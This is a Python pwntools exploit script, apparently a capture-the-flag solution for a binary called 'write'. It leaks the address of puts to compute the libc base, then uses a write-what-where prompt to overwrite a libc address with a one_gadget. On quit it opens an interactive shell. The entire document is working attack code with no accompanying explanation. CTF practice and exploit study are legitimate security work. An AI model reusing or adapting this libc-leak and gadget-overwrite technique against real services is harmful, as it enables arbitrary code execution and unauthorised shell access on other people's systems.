from pwn import *
#r=remote('pwn.byteband.it',9000)

r=process('./write',env={'LD_PRELOAD':'./libc-2.27.so'})
gdb.attach(r)
a=r.recvline().replace("\n","")
puts=a.split()[1]
puts=int(puts,16)
libc_base=puts-0x809c0
write_adr=libc_base+4093752
one_gadget=libc_base+0x4f322
log.info("Libc base -> %08x",libc_base)
log.info("Write_addr -> %08x",write_adr)
log.info("Gadget -> %08x",one_gadget)

print r.recvuntil("(q)uit\n")
r.sendline('w')
r.recvuntil("ptr:")
r.sendline(str(write_adr))

r.recvuntil(" val:")

r.sendline(str(one_gadget))
print r.recv()
r.sendline('q')
r.interactive()
